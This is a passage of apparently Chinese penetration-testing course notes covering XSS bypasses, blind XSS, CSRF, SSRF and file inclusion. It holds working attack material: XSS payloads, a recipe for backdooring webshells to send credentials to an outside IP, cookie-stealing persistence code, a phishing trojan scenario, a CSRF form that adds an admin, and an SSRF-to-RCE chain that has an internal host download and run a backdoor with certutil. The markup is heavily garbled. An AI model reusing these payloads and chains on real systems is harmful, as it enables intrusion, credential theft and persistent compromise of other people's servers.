#注意事项：因为sqlite只有一个数据库，所以直接开始获取tables即可
--tables
--columns -T WSTMart_reg
--dump -C &quot;name,password&quot; -T WSTMart_reg
</code></pre>
</li>
</ul>
<p>#案例4-引出实战-编码性注入手工及工具测试</p>
<p>手工：</p>
<ul>
<li>首先要对加密的参数进行解密</li>
<li>再解密后的参数的值后面拼接sql语句</li>
<li>接着对拼接的sql语句进行加密</li>
<li>将加密后的语句拼接到url里进行执行</li>
</ul>
<p>工具：</p>
<ul>
<li>python sqlmap.py -u “<a href="http://xxxx/?id=*&quot;">http://xxxx?id=*&quot;</a> –tamper=base64encode.py</li>
</ul>
<p>sqlmap的目录结构</p>
<ul>
<li><a href="https://blog.csdn.net/qq_21500173/article/details/53648696">sqlmap 的源码学习笔记一之目录结构_这块盾牌有待改良-CSDN博客</a></li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>26-30、渗透测试(xiaodi)</title>
    <url>/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
    <content><![CDATA[<p>26、Flashxss&amp;mxss&amp;uxss&amp;FuzzBypass</p>
<p>1、mxss&amp;uxss&amp;flashxss</p>
<p>2、XSS代码层防护及绕过思路</p>
<ul>
<li>防护的分类<ul>
<li>代码层面<ul>
<li>限制输入长度    <ul>
<li>可以通过修改length的数值来绕过</li>
</ul>
</li>
<li>关键字过滤<ul>
<li>换其它关键字、使用标签绕过</li>
</ul>
</li>
<li>将尖括号实体化<ul>
<li>使用事件</li>
</ul>
</li>
</ul>
</li>
<li>用户的设置</li>
<li>waf防护</li>
</ul>
</li>
</ul>
<span id="more"></span>

<p>3、XSS手工及项目检测bypass</p>
<p>#案例1-mxss&amp;uxss案例分析</p>
<ul>
<li>xss入门与介绍：<ul>
<li><a href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a></li>
</ul>
</li>
<li>mxss<ul>
<li>特点：比较鸡肋，应用的场景少</li>
<li>定义：我们在一个地方拆入xss，但是被过滤了，导致无危害，但是如果我们将该文章分享到qq或者等其他地方，并且这些平台会对我们的分享的文章产生预览功能，这样的话可能会导致mxss</li>
<li>漏洞场景<ul>
<li>低版本的pc的qq以前存在mxss，新版本的qq只对比较大和信任的网站提供预览功能，比如新浪或者其他的，但是我们在新浪或者其他平台很少有发表信息的权限</li>
</ul>
</li>
</ul>
</li>
<li>uxss<ul>
<li>定义：<ul>
<li>利用的是浏览器或者浏览器插件本身的漏洞，这种漏洞只有很牛逼的大佬才能挖到，挖到一个可能就几万美元了</li>
</ul>
</li>
<li>uxss和普通xss的区别<ul>
<li>普通xss因为浏览器同源策略的原因，只能获取到某个网站的cookie，但是uxss是从浏览器本身出发，所以可以获取到该浏览器里的所有网站的cookie，甚至可以调用windows里的其它程序</li>
</ul>
</li>
<li>案例：搜狗浏览器uxss：只要通过搜狗浏览器访问一个网站，就能执行特定的程序，比如计算机<ul>
<li>​                 <img src="https://docimg3.docs.qq.com/image/he4hu1DXFKD8iZPI45bgsw?w=1024&h=686?type=image/gif" alt="img">        </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>#案例2-flashxss案例分析实际利用</p>
<ul>
<li>```<br>谷歌搜索语法：filetype:swf inurl:xml意义：flash会加载一个远程的资源，而该资源的后缀就是xml，我们只需要将它加载的远程的xml换成我们自己构造的远程xml文件即可，同时在该xml文件里的开头的link处插入xss攻击代码攻击流程：    1、下载目标网站的xml，修改xml，将开头的link处修改为xss攻击代码    2、将修改后的xml放入自己的网站中    3、在xml的当前目录创建一个Crossdomain.xml   该文件的作用是给目标网站对我们修改的xml文件的访问权限，Crossdomain.xml的代码如下<?xml version="1.0"?><cross-domain-policy>    <allow-access-from domain="*.xxx.xxx" /></cross-domain-policy>    4、将目标网站的url里的xml链接替换为我们自己的服务器上的xml链接，然后访问即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"></span><br><span class="line">#案例3-绕过代码层过滤分析bypass</span><br><span class="line"></span><br><span class="line">- 参考链接</span><br><span class="line"></span><br><span class="line">  - xss靶场：https://github.com/do0dl3/xss-labs</span><br><span class="line">  - xss小结：https://xz.aliyun.com/t/2936</span><br><span class="line"></span><br><span class="line">- 绕过方法</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    &lt;script&gt;alert(1)&lt;/script&gt; 普通&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//  闭合&#x27; onclick=alert(1) // 闭合事件，这里的2个斜杠代表着注释#如果尖括号被过滤（实体化），可以尝试使用事件来触发&quot; onclick=alert(1) // 闭合事件#如果事件的关键字被过滤，可以尝试其他的事件，参考文章https://xz.aliyun.com/t/2936  这里面有很多其他的事件&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;aa&lt;/a&gt; // 闭合自定义&quot;&gt;&lt;sCript&gt;alert(1)&lt;/scRipt&gt; //html大小写</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>#案例4-项目自动探针&amp;手工Fuzz发包</p>
<ul>
<li><p>参考链接</p>
<ul>
<li><p>xss识别工具：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
<ul>
<li><p>特点：能fuzz，能识别waf，能绕过waf，xss专用工具</p>
</li>
<li><p>缺点：没有人工那么智能，有时候一些地方跑不出来</p>
</li>
<li><p>批量扫描：</p>
<ul>
<li>```python<br>python3 xsstrike.py –seeds urls.txt<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 手工fuzz</span><br><span class="line"></span><br><span class="line">    - 优点：能测出一些工具跑不出来的xss</span><br><span class="line">    - xss的fuzz字典：https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">    - 手工方法：</span><br><span class="line">      - 将payload的位置加变量，然后加载字典即可</span><br><span class="line"></span><br><span class="line">- 使用建议：</span><br><span class="line"></span><br><span class="line">  - 推荐工具+手工fuzz，就能跑出大部分的xss了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">技巧：怎么获取免费的在线靶场？</span><br><span class="line"></span><br><span class="line">- [靶场训练 (ikillyou.top)](https://bachang.ikillyou.top/)</span><br><span class="line"></span><br><span class="line">- 在fofa里搜索靶场的关键字，可以是靶场里的内容，也可以是靶场url里的关键字，比如我们这里使用的xsslabs</span><br><span class="line">  - ![image-20210805203504172](/source/images/image-20210805203504172.png)</span><br><span class="line">- 可以直接在fofa里搜索url里的关键字xsslabs，即可获取别人搭建的靶场</span><br><span class="line">  - ![image-20210805203646965](/source/images/image-20210805203646965.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 27、XSS红队盲打&amp;蓝队钓鱼直打&amp;权限维持</span><br><span class="line"></span><br><span class="line">关于红蓝队环境安装：https://github.com/ffffffff0x/f8x</span><br><span class="line"></span><br><span class="line">- 功能：支持一键安装红队和 蓝队的需要的环境</span><br><span class="line">- ![image-20210806133210501](/source/images/image-20210806133210501.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xss直打和盲打</span><br><span class="line"></span><br><span class="line">- 直打：可以看的见返回的数据，比如xss成功或者失败，我们可以根据显示结果，再来尝试绕过</span><br><span class="line"></span><br><span class="line">  - 留言板</span><br><span class="line">  - 评论</span><br><span class="line">  - </span><br><span class="line"></span><br><span class="line">- 盲打：xss打过去，不知道会不会成功，没有返回的结果显示，所以没有绕过这一说法</span><br><span class="line"></span><br><span class="line">  - 与客服的聊天窗口</span><br><span class="line"></span><br><span class="line">  - 意见反馈（我们用户看不到并且只有官方才能看的到的那种）</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#案例1-红队盲打-目标webshell箱子反杀记webshell大全：https://github.com/tennc/webshell#情节：网上有的作者很坏，免费分享各种webshell，但是这种webshell里却带有后门，当我们使用他的webshell拿下权限并且登录后，对方的webshell会将我们获取的webshell地址和密码发送给作者，所以我们相当于给别人打工了收信：http://47.94.236.117/admin/login.asp      #这个是作者用来储存它的带后门的webshell发送过来的网站#小白中招流程与反制	1、喜滋滋的得到了“好心人”发布的牛逼的webshell    2、经过苦战，拿下网站的权限，下面是shell地址，和密码		被控：http://test.xiaodi8.com/1.php angel    3、小白开始登录shell，输入密码    4、GG，小白中招了，在小白登录webshell的一瞬间，该webshell向远程的一个地址发送了信息，信息的内容就是小白刚刚获取的webshell地址和密码    5、至此，小白相当于给那个“好心的作者”打工了，自己获取到的shell和密码，结果作者也白嫖到了    6、恰巧，小白的同事小迪经过，根据经验分析，觉得小白很可能中招了，小迪在小白的webshell页面打开审查元素界面，并且刷新，发现了一个异常请求		http://47.94.236.117/api.asp?url=http://test.xiaodi8.com/phpspy2010.php&amp;pass=angel&amp;id=1    7、该请求是将shell的地址和密码发送到一个ip为47.94.236.117 的地址，此时小白欲哭无泪，求助小迪，于是小迪开始教小白怎么反制作者    8、因为作者会接收后门返回的shell地址和密码，很有可能会被集体存储在一个页面，所以我们可以用 xss进行反制    9、在异常请求的密码处构造payload，插入xss代码，这样一旦作者登录后台查看今天的收成时，对方很有可能中招，我们由此可以获取到对方储存webshell的地址的账户和密码，由此收获一大批webshell，payload如下：（这里的xss代码可以从xss在线平台获取）    http://47.94.236.117/api.asp?url=http://www.xiaodi8.com/phpspy2010.php&lt;sCRiPt sRC=https://xss.pt/Wrjg&gt;&lt;/sCrIpT&gt;&amp;pass=angel&lt;sCRiPt sRC=https://xss.pt/Wrjg&gt;&lt;/sCrIpT&gt;&amp;id=1    10、到了下午，小白的xss明显被成功触发，因为他在它的xss平台获取到了一个地址和cookie，登录进去发现了大量的webshell    	</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#怎么制作带后门的webshell1、首先找到一个正常的webshell2、编辑webshell，因为正常的webshell都几乎会获取到shell地址和设置shell密码，这些都在webshell文件里有，所以我们只需要使用下面的语句插入进去，一个带后门的webshell就制作成功了echo &quot;&lt;script src=&#x27;http://47.94.236.117/api.asp?url=$url&amp;pass=$admin[&#x27;pass&#x27;]&#x27;&gt;&lt;/script&gt;&quot;;#这里的变量$url和$admin[&#x27;pass&#x27;]  都是webshell里的变量，当我们制作带后门的webshell时，需要根据实际情况修改#怎么防止别人发现webshell里的后门？只需要将后门代码进行加密即可</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="/source/images/image-20210806130753815.png" alt="image-20210806130753815"></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例2-蓝队直打-目标hook配合钓鱼反杀记蓝队a：	任务：保护网站test.xiaodi8.com 网站红队b：	任务：攻击test.xiaodi8.com 网站1、为了防止网站被红队攻击，蓝队a在test.xiaodi8.com的网站首页插入了beef的上线payload	https://github.com/beefproject/beef/wiki/Installation#docker-setup      #通过docker安装beef2、这样一旦有恶意攻击者访问该页面，就会中招，在蓝队的beef里上线，想到这里，蓝队觉得还不够，蓝队还想拿下红队b的攻击电脑的权限，于是蓝队a想通过flash钓鱼来攻击红队b，于是蓝队下载了项目Flash-Pop，Flash-Pop 是一个flash钓鱼的页面，只需要将其下载下来，解压放到网站即可。	https://github.com/r00tSe7en/Flash-Pop      #这是flash的钓鱼页面，只需要将其下载下来，解压放到网站即可3、为了配合flash钓鱼，蓝队a使用css生成了exe木马，为了falsh钓鱼的真实性，蓝队a对exe木马的图标和相关信息进行了修改	Restorator 资源文件加工，可以修改软件，比如exe文件的一些信息，图标等等，该软件在迪哥的资料包里有，第二课的资料包4、下午，红队b心情不好，决定开始攻击test.xiaodi8.com 网站，一访问，蓝队a那里就发现红队b在自己的beef里上线了，立马实行跳转的payload，跳转到：http://test.xiaodi8.com/flash/  而该页面，就是刚刚从项目Flash-Pop里下载下来的，该页面十分逼真，会提示更新flash，红队b看到后，想也不想的下载更新了，因为他心情不好，所以想快点升级完接着攻击网站test.xiaodi8.com5、下载到电脑，看到这个flash程序，红队b还是有警惕心理的，自己看了看flash的相关信息、图标，没发现什么问题，双击安装6、“哈哈，总算抓到红队了”，蓝队a大笑到，因为红队b刚刚运行了伪装成flash.exe的木马程序，蓝队a的css里已经看到一台主机上线了，通过css可以查看红队b的电脑文件、屏幕截图等等#升级玩法：	1、可以对木马程序进行免杀    2、可以对木马程序的版本信息、作者进行修改，让其和真正的flash程序保持一致，增加真实性    3、可以将木马程序和官方版本的flash文件进行捆绑，这样用户点击木马，真正的flash程序也会执行，这样更加的真实</span></span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例3-红队技能-利用Xss+Cookie权限维持Webshell箱子配合xss平台使用, 在红蓝对抗里面 ，红队经常要控制权限，其中web权限大部分都采用的shell控制， 但是shell会出现被删除，被拦截，被查杀等情况，漏洞也有可能被找到修复到，那么下一次控制的机会就基本没有了.所以我们利用一个小技巧，将盗取cookie的js代码植入到后台登录成功的文件中去，实现每个登录成功的操作都会将其cookie发送到平台，这样实现了长期的控制，并且这个代码不会被查杀 拦截 等情况 安全完美，条件：你获的的webshell权限之后的事情#举例子：127.0.0.1/login.php  这是登录的页面     127.0.0.1/index.php 这是登录成功的页面，所以我们的xss代码插在index.php文件里最好，因为这是登录成功才会发送cookie，如果插在login.php，登录失败也会发送cookie，而登陆失败的cookie我们肯定不需要，所以啊，我们拿到shell，为了维持权限，找到一个登录成功后的文件，插入xss代码，比如这里就是在index.php里插入</span></span><br></pre></td></tr></table></figure>





<h2 id="28、CSRF-amp-SSRF协议-amp-内网探针-amp-漏洞利用"><a href="#28、CSRF-amp-SSRF协议-amp-内网探针-amp-漏洞利用" class="headerlink" title="28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用"></a>28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用</h2><p>#案例1-CSRF-后台自动添加管理员</p>
<ul>
<li><p>原理：当我们发现一个目标站，接着的登录该目标站，管理员或者普通用户登录都可以，接着登录进去抓包分析里面的各种操作，比如转账、添加信息或者添加账户、删除等操作的数据包我们可以抓包看一下，然后观察这些数据包里有没有设置session，如果没有，那么就可以尝试构造csrf，构造后，如果被攻击者正在处于登录状态的浏览该网站，我们只需要将我们构建的csrff恶意页面发送给对方，对方如果打开了，那么对方就会触发csrf漏洞</p>
</li>
<li><p>防护手段：</p>
<ul>
<li>设置session</li>
<li>设置验证码</li>
<li>设置同源策略</li>
</ul>
</li>
<li><p>csrf在src挖掘中的应用</p>
<ul>
<li>当我们发现该网站的请求数据包里没有session的时候，可以尝试创建2个普通账户，然后进行csrf操作</li>
</ul>
</li>
<li><p>前提：</p>
<ul>
<li>被攻击者必须要在网站登录的状态下，比如后台</li>
<li>攻击者必须了解他攻击的网站的一些情况，比如添加管理员的数据包</li>
</ul>
</li>
<li><p>场景说明：见讲解</p>
<ul>
<li><p>我正在后台玩耍时，突然群内小伙子发给我一个网站，说上面有好东西，我打开了！</p>
</li>
<li><p>我正在浏览的网站，并且已经登录：<a href="http://47.94.236.117/admin/index.asp">http://47.94.236.117/admin/index.asp</a></p>
</li>
<li><p>小伙子给我的网站（该网站有恶意代码）：<a href="http://test.xiaodi8.com/add.html">http://test.xiaodi8.com/add.html</a></p>
<ul>
<li>```html<html>    <head lang="en">    <title>csrf_post</title>    <script>    window.onload = function() {    document.getElementById("postsubmit").click();  } </script></head><body>       <form action="http://47.94.236.117/admin/addadminuser.asp?action=add"  method="POST">            <input type="text" name="username" value="xiaodi"><br>            <input type="hidden" name="password" value="xiaodi"><br>            <input type="hidden" name="password1" value="xiaodi"><br>            <input id="postsubmit" type="submit" name="submit" value="submit" />       </form></body></html>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 当我访问上面这些代码构成的恶意页面，我之前正在访问的网站就会自动添加一个账户名和密码都为xiaodi的管理员账户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-SSRF-利用各种协议信息探针</span><br><span class="line"></span><br><span class="line">- ssrf存在的地方：核心就是加载远程连接（url）的地方，比如加载远程图片、远程网页等等</span><br><span class="line">  - 从功能上查找</span><br><span class="line">    - 分享：通过url地址分享网页内容</span><br><span class="line">    - 转码服务：通过url地址把源地址的网页内容调优使其适合收集</span><br><span class="line">    - 在线翻译：通过url地址翻译该地址对应的文本的内容，提供此功能的有百度、有道</span><br><span class="line">    - 图片加载与下载：通过url地址加载或者下载图片</span><br><span class="line">    - 图片、文章收藏功能</span><br><span class="line">    - 未公开的api实现以及其他调用url的功能</span><br><span class="line">  - 从url关键字查找</span><br><span class="line">    - share</span><br><span class="line">    - wap</span><br><span class="line">    - url</span><br><span class="line">    - link</span><br><span class="line">    - src</span><br><span class="line">    - source</span><br><span class="line">    - target</span><br><span class="line">    - u</span><br><span class="line">    - 3g</span><br><span class="line">    - display</span><br><span class="line">    - sourceURI</span><br><span class="line">    - imageURL</span><br><span class="line">    - domain</span><br><span class="line">- ssrf的验证：</span><br><span class="line">  - burpsuit抓包，看它是否请求了一个其他的url地址</span><br><span class="line">  - 右键打开图片，看图片的地址是否是一个url</span><br><span class="line">- ssrf的绕过</span><br><span class="line">  - 使用@符号，比如:http://cehshi.com@10.10.10.10   在@符号前，放上一个正常的地址，@符号后放上我们要探测的ip</span><br><span class="line">  - ip地址转换：将ip地址转换为十进制数字</span><br><span class="line">- 特点：最主要的作用是进行信息的收集，然后可以根据收集的信息，比如内网的其他机器以及其他机器运行的服务，并在网络上搜索看这些服务是否有历史漏洞，然后利用</span><br><span class="line">- 分类：</span><br><span class="line">  - 有回显：比较简单</span><br><span class="line">  - 无回显：利用复杂，后续迪哥的ctf课程会讲</span><br><span class="line">- 定义：网站a存在ssrf漏洞，我们可以通过该漏洞探测和网站a所在的服务器a下的同一个局域网下的其他机器，同时也可以读取服务器a的端口，开启的各项服务、本地的文件等等</span><br><span class="line">- ssrfSSRF漏洞(原理&amp;绕过姿势)：https://www.t00ls.net/articles-41070.html</span><br><span class="line">- ssrf的功能：端口扫描&amp;指纹识别&amp;内网探针&amp;漏洞利用等</span><br><span class="line">- ssrf案例讲解</span><br><span class="line">  - 假设网站：127.0.0.1:8081/ssrf.php  存在ssrf存在漏洞</span><br><span class="line">  - 1、首先修改请求的网址，比如加载的远程的地址，将其改为：http://127.0.0.1:8081/phpmyadmin/  这是探测对方8081端口是否开启了phpadmin</span><br><span class="line">  - 2、读取文件file:///D:/www.txt</span><br><span class="line">  - 3、探测对方是否开启了3306端口：dict://192.168.46.133:3306/info</span><br><span class="line">  - 读取对方的ftp服务器里的文件：ftp://192.168.46.133:21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssrf不同的脚本语言支持的各种协议</span><br><span class="line"></span><br><span class="line">- ​                 ![img](https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&amp;h=527)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-SSRF-信息探针&amp;漏洞利用&amp;权限</span><br><span class="line"></span><br><span class="line">- 通过ssrf获取内网内的其他机器的权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
场景说明：网站127.0.0.1:8081/ssrf_exp.php 存在ssrf漏洞，并且在该网站所在的服务器所处的局域网内还有其他机器，我们的目标就是获取其他机器的权限1、发现了存在ssrf的网站：127.0.0.1:8081/ssrf_exp.php2、进行信息探测：    通过构造payload：http://192.168.0.1   将内网的ip段做成字典，内网ip段参考下文，如果存在该ip，并且该ssrf是回显ssrf的话，会有数据回显，此时探测到内网ip：192.168.46.133    接着进行探测端口，一样的，192.168.46.133:x   将x做成字典，然后进行探测，经过探测，发现端口8080，该端口发现了hfs服务3、根据探测到的服务，进行利用，百度搜索hfs漏洞利用，发现hfs有命令执行漏洞4、那么接下来可以利用命令执行添加一个账户和密码：http://192.168.46.133:8080//?search==%00{.exec|cmd /c net user hack 123 /add.} 5、问题来了，我们创建了账户却无法直接连接，因为192.168.46.133处于内网，所以我们无法直连，只能让该服务器反连，有两种思路：    思路一：让该内网机器下载后门，下载后，通过命令执行，让它执行后门    思路二：让虚拟机下载转发脚本，执行转发脚本转发shell出来    推荐：推荐思路一6、通过css制作后门，然后将它放到我们的服务器上，使其可以通过url下载：    后门地址：    http://47.94.236.117/mm.exe 7、通过命令执行，使内网机器下载后门    下载EXE后门：    http://192.168.46.133:8080/?search==%00{.exec|cmd.exe%20/c%20certutil%20-urlcache%20-split%20-f%20http://47.94.236.117/mm.exe.}  8、通过命令执行，让内网机器执行后门    执行EXE后门：    http://192.168.46.133:8080/?search==%00{.exec|mm.exe.} 9、上线成功
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 内网ip段</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    以下IP段的地址都是内网IP地址。（1）10.0.0.0 到 10.255.255.255（2）172.16.0.0 到172.31.255.255（3）192.168.0.0 到192.168.255.255</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>#案例4-SSRF-某实际案例测试演示(功能)</p>
<ul>
<li>SSRF漏洞(原理&amp;绕过姿势)<ul>
<li><a href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></li>
</ul>
</li>
</ul>
<h2 id="29、文件包含-amp-LFI-amp-RFI-amp-协议利用"><a href="#29、文件包含-amp-LFI-amp-RFI-amp-协议利用" class="headerlink" title="29、文件包含&amp;LFI&amp;RFI&amp;协议利用"></a>29、文件包含&amp;LFI&amp;RFI&amp;协议利用</h2><p>#知识点：</p>
<ul>
<li>1、解释-什么是文件包含<ul>
<li>定义：<ul>
<li>是开发者在开发中为了一些文件和功能的复用而采用的一种方法，通过文件包含，可以提高工作效率，对于相同的功能，只需要将其写成一个模块，以后调用的时候直接包含该文件即可，而不需要每次调用都重新写大量的代码</li>
</ul>
</li>
<li>特性：<ul>
<li>被包含的文件，都会被解析，文件内容是什么格式的，就会按照什么格式解析，比如1.txt里包含php一句话木马，如果包含1.txt，它也会按照php解析</li>
</ul>
</li>
</ul>
</li>
<li>2、应用-为什么会出现包含<ul>
<li>变量名可控</li>
</ul>
</li>
<li>3、分类-本地LFI&amp;远程RFI</li>
<li>4、利用-过滤无过滤&amp;伪协议</li>
</ul>
<p>文件包含可能存在的情况：</p>
<ul>
<li>观察url里带等于号 = 后面接的是否是文件或者</li>
<li>变种文件包含：就是等于号 = 后面接的虽然是文件，但是没有带文件后缀，这样的我们很容易忽略，但是这里也可能存在文件包含的<ul>
<li>举例：127.0.0.1/index.php?page=login    <ul>
<li>这里很大概率就是包含login.php文件，之所以没有php后缀，因为它的代码是这样写的：include($_GET[‘file’].’php’)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>文件包含的检测：</p>
<ul>
<li>将上面可能存在文件包含的一些关键字进行替换，比如url：127.0.0.1/index.php?page=login      可以将login替换成index，看页面是否有变化，有就代表此处存在文件包含</li>
</ul>
<p>不同操作系统的敏感文件的位置</p>
<ul>
<li><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h4><blockquote>
<p>c:\boot.ini // 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>c:\ProgramFiles\mysql\my.ini // MySQL配置<br>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>c:\windows\php.ini // php 配置信息</p>
</blockquote>
<h4 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h4><blockquote>
<p>/etc/passwd // 账户信息<br>/etc/shadow // 账户密码文件<br>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>/usr/local/app/php5/lib/php.ini // PHP相关配置<br>/etc/httpd/conf/httpd.conf // Apache配置文件<br>/etc/my.conf // mysql 配置文件</p>
</blockquote>
</li>
</ul>
<p>文件包含各个脚本代码：</p>
<ul>
<li>```<br>ASP,PHP,JSP,ASPX等<!--#include file="1.asp" --><!--#include file="top.aspx" -->&lt;c:import url=”<a href="http://thief.one/1.jsp&quot;&gt;">http://thief.one/1.jsp&quot;&gt;</a>&lt;jsp:include page=”head.jsp”/&gt;&lt;%@ include file=”head.jsp”%&gt;<?php Include('test.php')?><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本地文件包含的两类写法：LFI</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  #将包含的文件名写死include(&#x27;check.php&#x27;)    #这样将文件名写死，就不存在漏洞    #通过变量控制    $file=$_GET[&#x27;filename&#x27;];	include($file);        这种情况我们可以控制变量名来进行包含                #通过变量+指定（写死）后缀控制         $file=$GET[&#x27;filename&#x27;];		include($_GET[&#x27;file&#x27;].&#x27;php&#x27;)         这种情况因为写死了后缀，如果我们继续包含1.txt,那么组合成的文件就是1.txt.php，这样肯定会包含失败，因为不存在该文件，所以我们只能通过截断或者注释的方法来进行绕过          绕过：基于php低版本            	1、直接通过 %00 来进行截断            	需要前提：            			magic_quotes_gpc = Off					   PHP版本&lt; 5.3.4            http://127.0.0.1:8081/include.php?filename=1.txt%00				2、通过构造payload长度来挤掉后门的php后缀，因为url的长度是有限制的，当超过一定的长度，就会导致后面的拼接的代码拼接不上去，从而绕过代码里强制添加的php后缀，我们可以通过 ../   来构造长度                    http://127.0.0.1:8081/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././		绕过：基于php高版本：使用伪协议进行绕过            data://text/plain,&lt;?php%20phpinfo();?&gt;                                </span><br></pre></td></tr></table></figure></li>
</ul>
<p>#案例2-RFI-远程文件包含代码测试</p>
<ul>
<li>```php<br>1、无过滤情况，直接包含    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt2%E3%80%81%E5%A6%82%E6%9E%9C%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E6%AF%94%E5%A6%82%E7%B1%BB%E4%BC%BC%E4%BA%8E%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%86%99%E6%AD%BB%E4%BA%86%E5%90%8E%E7%BC%80%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%88include($_GET%5B&#39;file&#39;].&#39;php&#39;)%EF%BC%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8B%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt2、如果过滤了，比如类似于上面的本地包含一样，写死了后缀的情况下（include($_GET[&#39;file&#39;].&#39;php&#39;)），可以通过以下方法绕过</a>    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%00">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%00</a>        #这里的%23代表 #    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%23">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%23</a>    #这里的问号 ？ 代表着将源代码里写死的php后缀当作参数    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt?%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A%E8%AF%AD%E8%A8%80%E8%AE%BE%E7%BD%AE%E9%87%8C%E9%9D%A2%E6%88%96%E4%BB%A3%E7%A0%81%E9%99%90%E5%88%B6%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%BF%99%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E6%B5%8B%E8%AF%95%E5%8D%B3%E5%8F%AF%EF%BC%81">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt?注意事项：语言设置里面或代码限制会导致这个远程包含禁用，在实战中测试即可！</a>    allow_url_fopen = On（是否允许打开远程文件）    allow_url_include = On（是否允许include/require远程文件）通过从PHP study Pro中的php配置文件来看，此项默认是off。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-协议-各种协议提交包含测试</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  文件读取：如果不知道文件地址，可以读取当前页面下的php文件php://filter/convert.base64-encode/resource=1.txt     推荐这一种，这个不需要绝对路径file:///D:/phpstudy/PHPTutorial/WWW/1.txt        这种需要绝对路径RCE执行方法一：1、在url地址栏上拼接：php://input2、在hackbar的Post上输入:&lt;?php 